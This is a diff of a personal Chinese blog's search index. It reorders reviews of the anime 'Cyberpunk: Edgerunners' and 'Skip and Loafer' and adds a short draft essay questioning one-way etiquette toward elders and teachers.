-  <entry>
     <title>浮</title>
     <url>/2023/03/09/%E6%B5%AE/</url>
     <content><![CDATA[<p><img src="/images/RainGlass.png" alt="Rain"></p>
@@ -8075,37 +8080,18 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
-    <url>/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</url>
-    <content><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p>
+    <title>浅谈礼仪的对象</title>
+    <url>/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
+    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p>
 <span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nexflix上九月份一口气播完的，我是等了一段时间，等风评落地才来看的。<br>虽说如此，这部仅有10集的动画我也看了一个月左右。终于今天把最后三集看完了。<br>知道这款游戏，但我没玩也没了解，一无所知没有被剧透来看这部动画，真是一种享受~</p>
-<p><img src="/images/Lucy&David2.png" alt="Lucy&amp;David"></p>
-<h1 id="色彩"><a href="#色彩" class="headerlink" title="色彩"></a>色彩</h1><p>先来聊聊这个吧，毕竟是能给人最直观感受的方式。<br><font color=Crimson>非常符合我心中对于赛博朋克世界的想象，单凭画面就能让我感受到那股<strong>荒诞离奇</strong>了。对于少有看日本动画的人而言，恐怕很轻易以为这是美国制作的动画吧。不仅如此，这样的画风还带来一个非常有利于动画剧情的好处，对于这样一个动作少不了的动画而言，这样的画风能够提供<strong>足够的张力</strong>。</font>可惜身边只有笔记本这样的小屏幕，如果有够大的屏幕，一定能完美地感受到动画洋溢出来的力量。</p>
-<p><img src="/images/Lucy3.png" alt="Lucy"></p>
-<h1 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h1><p>或许因为该游戏制作团队是欧美人，同时游戏设定在美国，动画投资者是Netflix，本作的音乐的确是更为偏向于欧美的风格。<font color=Darkorange>op的氛围倾向于<strong>毁灭</strong>，而ed则是一种<strong>悲剧</strong>的感觉。总之，音乐方面给足了暗示吧。如果说，片头片尾的音乐是符合整部动画气氛，那么最后一集的插曲，就是<strong>侧耳动听之余给人带来无限的悲伤</strong>吧。</font>当然，还有其它插曲，也很符合动画气氛，这里不再一一提起。<br>片头曲：This Fffire<br>片尾曲：Let You Down<br>动画插曲：I Really Want to Stay at Your House</p>
-<p><img src="/images/kiss.png" alt="kiss"></p>
-<h1 id="剧情"><a href="#剧情" class="headerlink" title="剧情"></a>剧情</h1><p><font color=DarkViolet>相较于传统日本动画，这一部动画仅有10集，这也造就了剧情异常紧凑，恰到好处地略去了那些不用解释观众也能自行领会的部分，各个转场不说浑然天成，也是毫无突兀感。从一开始较快的节奏，作了一点铺垫。慢慢地，剧情一点点加速，再也无法分出一点精力去注意外界杂讯。<strong>精彩绝伦</strong>谓之毫不为过。</font><br><font color=DarkRed>这绝不是好莱坞式爆米花电影，无论是画面音乐还是剧情，都堪称<strong>一流水准</strong>。倘如只是抱着轻松娱乐的心态来看这部动画，也并非不行，但我想恐怕只能收获肤浅简单的想法吧。面对这样一部一年或许仅有一部的短小精悍的动画佳作，岂不是太可惜了吗？</font></p>
-<p><img src="/images/Lucy8.png" alt="Lucy"></p>
-<h1 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h1><p>各个人物的塑造都十分生动形象，可见制作功底的有力。<br><font color=Magenta>若要问我哪个人物最喜欢，那无疑是<strong>丽贝卡(Rebecca)</strong>，萝莉身材，豪爽作风，平时个性嘻嘻哈哈疯疯癫癫，关键时刻可靠队友毫不含糊。喜欢着大卫(David)，却不因大卫喜欢露西(Lucy)而吃醋，处处关心与照顾大卫，是大卫唯一能托付的人。也因此，最后亚当重锤从天而降将丽贝卡杀害的时候我直接气得锤了桌子一下。老难受了啊！！！一直提心吊胆到最后，结果还是被杀了。亚当重锤，我要杀你一万次也不够！！！</font></p>
-<p><img src="/images/Rebecca2.png" alt="Rebecca"></p>
-<h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><font color=orange>
-无疑，这是一个极度资本化的世界，只要有钱，服务应有尽有。公安这些在资本面前不值一提，大公司的军事力量甚至能匹敌军队。大卫舍生去对抗公司，连公司的高层都无法触及。这部动画也能给未来的人带来一些警示吧。人的性命化为草芥，没有人在意。当沉浸于动画的时候，没有感觉到。当动画结束后，冷静下来，会发现，这部动画对于生命的处理如此简单以至于不会有人在看动画时缅怀逝去的生命，如大卫的母亲，丽贝卡的哥哥，曼恩(Marine)...或许有人认为是由于动画时长的因素，我想有这方面的因素，但有一个更重要的因素是，让人切身体会到夜之城的生命之轻，人的性命不值一提。
-大卫和他周围的同伴是反抗这个资本世界的人，他从底层来，用尽所有生命去反抗这不讲理又无解的世界。他们是有人性的人，所以讲义气，为同伴出生入死。他们是有人性的人，所以大卫杀死一个无辜的母亲会想到自己的母亲。也正因是有人性的人，所以最终会成为赛博精神病。于是，这样的人注定无法战胜冷血无情的公司，即资本。只要有人性就有弱点，从一开始便注定了失败的命运，何等悲哀！即便如此，他们也过了一段足够精彩的人生。书写了独属于他们的传奇。我想，即便再给他们一次机会，依然会做出这样的选择吧。</font>
-
-<p><img src="/images/Lucy4.png" alt="Lucy"></p>
-<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p><font color=MidnightBlue>据说，夜之城没有活着的传奇。我见证了大卫这个传奇人物的短暂一生，我见证了大卫与露西的动人恋情，我见证了赛博朋克的义薄云天，我见证了夜之城吃掉了一个又一个梦想…<br>在没看赛博朋克之前，通过零星的言论，我得知这是一部悲剧。我脑海中一直以为会是女主角露西的死去，可结局却是，两人起初在假月球相会，约好一起去月球，最终只有露西一个人去了真月球。而这样一个传奇，最终也被夜之城所吞噬，活在了传说之中。<br>昨晚的感想<strong>普通与特别</strong>，在赛博朋克里也讨论到了。<br>的确，相比于只装了少数小量级义体的人和曼恩他们，大卫是特别的。可是相较于亚当重锤这样几乎全身义体的人而言，大卫所装的沙德威斯坦只是入门级义体，那么大卫也只能算是普通人，承受不住改造金刚的压力。<br>其实普通与特别，只不过是相对之间，同时标准对于不同的人也是不同的，非常主观。我想每个人总有一点在周围人看来特别的部分吧，如果从里到外都是普通的，这样的人恐怕很少见，那其实也算特别吧。因此<strong>没必要纠结于普通或是特别，做自己就是最好</strong>。<br>在这个赛博朋克的世界里，要么堕落至深渊如尸体随处停放，要么过着安分守己的生活一辈子扫清尘土，要么让生命光辉灿烂在一瞬间达到永恒。或许现实世界也是一样，可在这个世界，对比就异常明显了。我们的世界，未来会这样吗？<strong>是否能见证赛博朋克的到来呢？</strong></font></p>
-<p><img src="/images/Lucy2.png" alt="Lucy"></p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>过一两年，等剧情都忘得差不多的时候，把赛博朋克游戏买了吧。想必那时候又有全新的体验了，很有趣，不是吗？</p>
-<p><img src="/images/Lucy5.png" alt="Lucy"></p>
+<h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>
 ]]></content>
       <categories>
-        <category>动画</category>
-        <category>赛博朋克</category>
+        <category>随想</category>
       </categories>
       <tags>
-        <tag>动画</tag>
+        <tag>随想</tag>
+        <tag>礼仪</tag>
       </tags>
   </entry>
   <entry>
@@ -8338,6 +8324,60 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
+    <url>/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</url>
+    <content><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nexflix上九月份一口气播完的，我是等了一段时间，等风评落地才来看的。<br>虽说如此，这部仅有10集的动画我也看了一个月左右。终于今天把最后三集看完了。<br>知道这款游戏，但我没玩也没了解，一无所知没有被剧透来看这部动画，真是一种享受~</p>
+<p><img src="/images/Lucy&David2.png" alt="Lucy&amp;David"></p>
+<h1 id="色彩"><a href="#色彩" class="headerlink" title="色彩"></a>色彩</h1><p>先来聊聊这个吧，毕竟是能给人最直观感受的方式。<br><font color=Crimson>非常符合我心中对于赛博朋克世界的想象，单凭画面就能让我感受到那股<strong>荒诞离奇</strong>了。对于少有看日本动画的人而言，恐怕很轻易以为这是美国制作的动画吧。不仅如此，这样的画风还带来一个非常有利于动画剧情的好处，对于这样一个动作少不了的动画而言，这样的画风能够提供<strong>足够的张力</strong>。</font>可惜身边只有笔记本这样的小屏幕，如果有够大的屏幕，一定能完美地感受到动画洋溢出来的力量。</p>
+<p><img src="/images/Lucy3.png" alt="Lucy"></p>
+<h1 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h1><p>或许因为该游戏制作团队是欧美人，同时游戏设定在美国，动画投资者是Netflix，本作的音乐的确是更为偏向于欧美的风格。<font color=Darkorange>op的氛围倾向于<strong>毁灭</strong>，而ed则是一种<strong>悲剧</strong>的感觉。总之，音乐方面给足了暗示吧。如果说，片头片尾的音乐是符合整部动画气氛，那么最后一集的插曲，就是<strong>侧耳动听之余给人带来无限的悲伤</strong>吧。</font>当然，还有其它插曲，也很符合动画气氛，这里不再一一提起。<br>片头曲：This Fffire<br>片尾曲：Let You Down<br>动画插曲：I Really Want to Stay at Your House</p>
+<p><img src="/images/kiss.png" alt="kiss"></p>
+<h1 id="剧情"><a href="#剧情" class="headerlink" title="剧情"></a>剧情</h1><p><font color=DarkViolet>相较于传统日本动画，这一部动画仅有10集，这也造就了剧情异常紧凑，恰到好处地略去了那些不用解释观众也能自行领会的部分，各个转场不说浑然天成，也是毫无突兀感。从一开始较快的节奏，作了一点铺垫。慢慢地，剧情一点点加速，再也无法分出一点精力去注意外界杂讯。<strong>精彩绝伦</strong>谓之毫不为过。</font><br><font color=DarkRed>这绝不是好莱坞式爆米花电影，无论是画面音乐还是剧情，都堪称<strong>一流水准</strong>。倘如只是抱着轻松娱乐的心态来看这部动画，也并非不行，但我想恐怕只能收获肤浅简单的想法吧。面对这样一部一年或许仅有一部的短小精悍的动画佳作，岂不是太可惜了吗？</font></p>
+<p><img src="/images/Lucy8.png" alt="Lucy"></p>
+<h1 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h1><p>各个人物的塑造都十分生动形象，可见制作功底的有力。<br><font color=Magenta>若要问我哪个人物最喜欢，那无疑是<strong>丽贝卡(Rebecca)</strong>，萝莉身材，豪爽作风，平时个性嘻嘻哈哈疯疯癫癫，关键时刻可靠队友毫不含糊。喜欢着大卫(David)，却不因大卫喜欢露西(Lucy)而吃醋，处处关心与照顾大卫，是大卫唯一能托付的人。也因此，最后亚当重锤从天而降将丽贝卡杀害的时候我直接气得锤了桌子一下。老难受了啊！！！一直提心吊胆到最后，结果还是被杀了。亚当重锤，我要杀你一万次也不够！！！</font></p>
+<p><img src="/images/Rebecca2.png" alt="Rebecca"></p>
+<h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><font color=orange>
+无疑，这是一个极度资本化的世界，只要有钱，服务应有尽有。公安这些在资本面前不值一提，大公司的军事力量甚至能匹敌军队。大卫舍生去对抗公司，连公司的高层都无法触及。这部动画也能给未来的人带来一些警示吧。人的性命化为草芥，没有人在意。当沉浸于动画的时候，没有感觉到。当动画结束后，冷静下来，会发现，这部动画对于生命的处理如此简单以至于不会有人在看动画时缅怀逝去的生命，如大卫的母亲，丽贝卡的哥哥，曼恩(Marine)...或许有人认为是由于动画时长的因素，我想有这方面的因素，但有一个更重要的因素是，让人切身体会到夜之城的生命之轻，人的性命不值一提。
+大卫和他周围的同伴是反抗这个资本世界的人，他从底层来，用尽所有生命去反抗这不讲理又无解的世界。他们是有人性的人，所以讲义气，为同伴出生入死。他们是有人性的人，所以大卫杀死一个无辜的母亲会想到自己的母亲。也正因是有人性的人，所以最终会成为赛博精神病。于是，这样的人注定无法战胜冷血无情的公司，即资本。只要有人性就有弱点，从一开始便注定了失败的命运，何等悲哀！即便如此，他们也过了一段足够精彩的人生。书写了独属于他们的传奇。我想，即便再给他们一次机会，依然会做出这样的选择吧。</font>
+
+<p><img src="/images/Lucy4.png" alt="Lucy"></p>
+<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p><font color=MidnightBlue>据说，夜之城没有活着的传奇。我见证了大卫这个传奇人物的短暂一生，我见证了大卫与露西的动人恋情，我见证了赛博朋克的义薄云天，我见证了夜之城吃掉了一个又一个梦想…<br>在没看赛博朋克之前，通过零星的言论，我得知这是一部悲剧。我脑海中一直以为会是女主角露西的死去，可结局却是，两人起初在假月球相会，约好一起去月球，最终只有露西一个人去了真月球。而这样一个传奇，最终也被夜之城所吞噬，活在了传说之中。<br>昨晚的感想<strong>普通与特别</strong>，在赛博朋克里也讨论到了。<br>的确，相比于只装了少数小量级义体的人和曼恩他们，大卫是特别的。可是相较于亚当重锤这样几乎全身义体的人而言，大卫所装的沙德威斯坦只是入门级义体，那么大卫也只能算是普通人，承受不住改造金刚的压力。<br>其实普通与特别，只不过是相对之间，同时标准对于不同的人也是不同的，非常主观。我想每个人总有一点在周围人看来特别的部分吧，如果从里到外都是普通的，这样的人恐怕很少见，那其实也算特别吧。因此<strong>没必要纠结于普通或是特别，做自己就是最好</strong>。<br>在这个赛博朋克的世界里，要么堕落至深渊如尸体随处停放，要么过着安分守己的生活一辈子扫清尘土，要么让生命光辉灿烂在一瞬间达到永恒。或许现实世界也是一样，可在这个世界，对比就异常明显了。我们的世界，未来会这样吗？<strong>是否能见证赛博朋克的到来呢？</strong></font></p>
+<p><img src="/images/Lucy2.png" alt="Lucy"></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>过一两年，等剧情都忘得差不多的时候，把赛博朋克游戏买了吧。想必那时候又有全新的体验了，很有趣，不是吗？</p>
+<p><img src="/images/Lucy5.png" alt="Lucy"></p>
+]]></content>
+      <categories>
+        <category>动画</category>
+        <category>赛博朋克</category>
+      </categories>
+      <tags>
+        <tag>动画</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>跃动青春--你想选择怎样的人生</title>
+    <url>/2023/06/22/%E8%B7%83%E5%8A%A8%E9%9D%92%E6%98%A5--%E4%BD%A0%E6%83%B3%E9%80%89%E6%8B%A9%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BA%BA%E7%94%9F/</url>
+    <content><![CDATA[<p><img src="/images/SkipAndLoafer.png" alt="跃动青春"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一部轻松舒适温馨自然的动画。</p>
+<h1 id="你太耀眼"><a href="#你太耀眼" class="headerlink" title="你太耀眼"></a>你太耀眼</h1><p>无疑，女主岩仓美津未虽然从农村小地方来，表现却非常耀眼。这种耀眼程度，以至于第一话就让男主志摩聪介的内心发生了改变。美津未的人生态度积极进取，立志做一位官员，以改变家乡的环境。而聪介在没遇到美津未之前，人生态度是随波逐流，会融入环境，会承受别人的期待。<br>这让我想起了一部10年前的京都动画–冰菓。在这部动画中，男主折木也是一开始崇尚着灰色的生活，以节能自居，“不必要的事不做，必要的事尽快完成”。而女主千反田则是玫瑰色的生活，会享受青春，会去“我很好奇”。千反田慢慢地将折木改变，让他也踏入了玫瑰色的生活。<br>不同的是，冰菓的故事更多围绕在小团体之间，而跃动青春的故事更偏向于群像剧。而由于聪介内心的敏感和自卑，会更倾向于讨好他人。这一点我们可以从很多地方看出来：班上人起哄让聪介与美津未担任班长，发小莉莉华对聪介纠缠不休，聪介被迫演音乐剧…歌词里唱的“你太耀眼”如果不看情节单看封面，或许大部分人都会以为耀眼指的是男主。可实际上恰恰相反，在外貌上平平无奇的女主，才是男主眼中闪耀的光芒！</p>
+<h1 id="活得真诚"><a href="#活得真诚" class="headerlink" title="活得真诚"></a>活得真诚</h1><p>在这部动画里，所有的勾心斗角畏缩不前都被打破，取而代之的是真心换真心。美津未的存在就像是放入沙丁鱼群中的一条鲶鱼。把抱持着小心思，观望态度等的同学直接或间接地改变了。聪介，结月，美佳，久留米诚…也不得不说，这是一种幸运，没有遇到那种糟糕的人比较多的班级，否则等糟糕的人抱起团来，即便美津未也难以突破。<br>这部动画向我们展示了人与人之间的交往，真诚永远应当是第一选择。而人为什么会变得不真诚呢？聪介是因小时候负面影响，结月是被嫉妒，美佳是被嘲笑，久留米诚是被孤立。归结而言，是由于和周围人有不同之处造成格格不入，于是被小人攻击而中伤。大家害怕受伤，所以变得不真诚。<br>美津未以前班上的人很少，大家的联系都比较紧密。没有受过伤，所以不害怕。因为不害怕，所以能勇敢。而难能可贵的是同学们也能从害怕受伤的心理中走出来，去真诚对待他人。</p>
+<h1 id="个性鲜明"><a href="#个性鲜明" class="headerlink" title="个性鲜明"></a>个性鲜明</h1><p>前面说到，很多人之所以不真诚是因为害怕受伤，为了不受伤有的人选择磨灭自己的个性融入群体。本作就向我们很好地展示了不必隐藏自己的个性，即便是个性不同的人也能友好相处，甚至能成为非常好的朋友。因为成为朋友的关键不在于与他人相同，而在于尊重理解包容以及真切地想与他人成为朋友。如果做不到这些，那么即便有相同的兴趣爱好，相处起来也会很容易出问题，毕竟世上没有完全两个相同的人。<br>我想，如果不是有害的，不要去泯灭自己的个性。</p>
+<h1 id="勇敢向前"><a href="#勇敢向前" class="headerlink" title="勇敢向前"></a>勇敢向前</h1><p>朝前看，向前走。<br>美佳和美津未练习排球的时候被高年级学长欺负，被另一位学长看到及时解围。美佳选择记住欺负她的人，美津未选择记住帮助她的人。同样的事，不同的选择。美佳的选择让她面向消极，而美津未的选择让她面向积极。这是一种正反馈，好的更好，坏的更坏。这也是为什么要以高中生的校园生活作为舞台，正在经历变得成熟的过程，又不至于太过于成熟而变得思维固化，可谓是非常恰当的。<br>兼近学长也是和美津未同一类型的人，抱持着梦想不懈努力，所以一开始才会不理解为什么像聪介这样有童星经历的人为什么想隐藏身份，甚至触碰雷区。同样莉莉华想要把聪介和她一样困在过去，最终聪介走出来，选择了去追逐美津未这样闪闪发光的人。</p>
+<h1 id="教育意义"><a href="#教育意义" class="headerlink" title="教育意义"></a>教育意义</h1><p>很多人看这部动画感到温馨治愈舒适愉悦，贴近生活、行为也符合逻辑，让这部动画富有教育意义。<br>不单单局限在高中校园当中，我想这对于整个人生而言都适用。<br>人啊，就是要像跃动青春这样生活，世界才会变得更美丽~<br>所以，你想要选择什么样的生活呢？</p>
+<p>♪♪你太过耀眼，太过耀眼♪♪<br>♪♪令我不由得移开视线♪♪<br>♪♪我甚至找不到合适的话语 形容眼前的你♪♪</p>
+]]></content>
+      <categories>
+        <category>动画</category>
+      </categories>
+      <tags>
+        <tag>动画</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>飞鸟集--摘抄</title>
     <url>/2022/11/18/%E9%A3%9E%E9%B8%9F%E9%9B%86_%E6%91%98%E6%8A%84/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近突然想起了泰戈尔的飞鸟集里的一些诗，来了兴致，便又重读了飞鸟集，不由得感叹，诗真美啊。这样的美，大概是永恒吧。</p>
@@ -8359,26 +8399,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>诗</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>跃动青春--你想选择怎样的人生</title>
-    <url>/2023/06/22/%E8%B7%83%E5%8A%A8%E9%9D%92%E6%98%A5--%E4%BD%A0%E6%83%B3%E9%80%89%E6%8B%A9%E6%80%8E%E6%A0%B7%E7%9A%84%E4%BA%BA%E7%94%9F/</url>
-    <content><![CDATA[<p><img src="/images/SkipAndLoafer.png" alt="跃动青春"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一部轻松舒适温馨自然的动画。</p>
-<h1 id="你太耀眼"><a href="#你太耀眼" class="headerlink" title="你太耀眼"></a>你太耀眼</h1><p>无疑，女主岩仓美津未虽然从农村小地方来，表现却非常耀眼。这种耀眼程度，以至于第一话就让男主志摩聪介的内心发生了改变。美津未的人生态度积极进取，立志做一位官员，以改变家乡的环境。而聪介在没遇到美津未之前，人生态度是随波逐流，会融入环境，会承受别人的期待。<br>这让我想起了一部10年前的京都动画–冰菓。在这部动画中，男主折木也是一开始崇尚着灰色的生活，以节能自居，“不必要的事不做，必要的事尽快完成”。而女主千反田则是玫瑰色的生活，会享受青春，会去“我很好奇”。千反田慢慢地将折木改变，让他也踏入了玫瑰色的生活。<br>不同的是，冰菓的故事更多围绕在小团体之间，而跃动青春的故事更偏向于群像剧。而由于聪介内心的敏感和自卑，会更倾向于讨好他人。这一点我们可以从很多地方看出来：班上人起哄让聪介与美津未担任班长，发小莉莉华对聪介纠缠不休，聪介被迫演音乐剧…歌词里唱的“你太耀眼”如果不看情节单看封面，或许大部分人都会以为耀眼指的是男主。可实际上恰恰相反，在外貌上平平无奇的女主，才是男主眼中闪耀的光芒！</p>
-<h1 id="活得真诚"><a href="#活得真诚" class="headerlink" title="活得真诚"></a>活得真诚</h1><p>在这部动画里，所有的勾心斗角畏缩不前都被打破，取而代之的是真心换真心。美津未的存在就像是放入沙丁鱼群中的一条鲶鱼。把抱持着小心思，观望态度等的同学直接或间接地改变了。聪介，结月，美佳，久留米诚…也不得不说，这是一种幸运，没有遇到那种糟糕的人比较多的班级，否则等糟糕的人抱起团来，即便美津未也难以突破。<br>这部动画向我们展示了人与人之间的交往，真诚永远应当是第一选择。而人为什么会变得不真诚呢？聪介是因小时候负面影响，结月是被嫉妒，美佳是被嘲笑，久留米诚是被孤立。归结而言，是由于和周围人有不同之处造成格格不入，于是被小人攻击而中伤。大家害怕受伤，所以变得不真诚。<br>美津未以前班上的人很少，大家的联系都比较紧密。没有受过伤，所以不害怕。因为不害怕，所以能勇敢。而难能可贵的是同学们也能从害怕受伤的心理中走出来，去真诚对待他人。</p>
-<h1 id="个性鲜明"><a href="#个性鲜明" class="headerlink" title="个性鲜明"></a>个性鲜明</h1><p>前面说到，很多人之所以不真诚是因为害怕受伤，为了不受伤有的人选择磨灭自己的个性融入群体。本作就向我们很好地展示了不必隐藏自己的个性，即便是个性不同的人也能友好相处，甚至能成为非常好的朋友。因为成为朋友的关键不在于与他人相同，而在于尊重理解包容以及真切地想与他人成为朋友。如果做不到这些，那么即便有相同的兴趣爱好，相处起来也会很容易出问题，毕竟世上没有完全两个相同的人。<br>我想，如果不是有害的，不要去泯灭自己的个性。</p>
-<h1 id="勇敢向前"><a href="#勇敢向前" class="headerlink" title="勇敢向前"></a>勇敢向前</h1><p>朝前看，向前走。<br>美佳和美津未练习排球的时候被高年级学长欺负，被另一位学长看到及时解围。美佳选择记住欺负她的人，美津未选择记住帮助她的人。同样的事，不同的选择。美佳的选择让她面向消极，而美津未的选择让她面向积极。这是一种正反馈，好的更好，坏的更坏。这也是为什么要以高中生的校园生活作为舞台，正在经历变得成熟的过程，又不至于太过于成熟而变得思维固化，可谓是非常恰当的。<br>兼近学长也是和美津未同一类型的人，抱持着梦想不懈努力，所以一开始才会不理解为什么像聪介这样有童星经历的人为什么想隐藏身份，甚至触碰雷区。同样莉莉华想要把聪介和她一样困在过去，最终聪介走出来，选择了去追逐美津未这样闪闪发光的人。</p>
-<h1 id="教育意义"><a href="#教育意义" class="headerlink" title="教育意义"></a>教育意义</h1><p>很多人看这部动画感到温馨治愈舒适愉悦，贴近生活、行为也符合逻辑，让这部动画富有教育意义。<br>不单单局限在高中校园当中，我想这对于整个人生而言都适用。<br>人啊，就是要像跃动青春这样生活，世界才会变得更美丽~<br>所以，你想要选择什么样的生活呢？</p>
-<p>♪♪你太过耀眼，太过耀眼♪♪<br>♪♪令我不由得移开视线♪♪<br>♪♪我甚至找不到合适的话语 形容眼前的你♪♪</p>
-]]></content>
-      <categories>
-        <category>动画</category>
-      </categories>
-      <tags>
-        <tag>动画</tag>
       </tags>
   </entry>
   <entry>
